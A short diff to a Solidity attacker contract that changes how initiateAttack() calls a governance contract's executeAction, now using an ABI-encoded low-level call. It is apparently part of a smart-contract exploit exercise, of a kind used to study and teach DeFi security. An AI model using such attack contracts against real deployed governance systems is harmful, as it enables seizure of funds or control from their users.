@@ -40,6 +40,9 @@ contract AttackerContract{
 	}
 
 	function initiateAttack() public{
-		governance.executeAction(actionCounterId);
+		bytes memory payload = abi.encodeWithSignature("executeAction(uint256)",actionCounterId);
+		(bool success, ) = address(governance).call(payload);
+		require (success,"Attack Failed");
+		
 	}	
 }
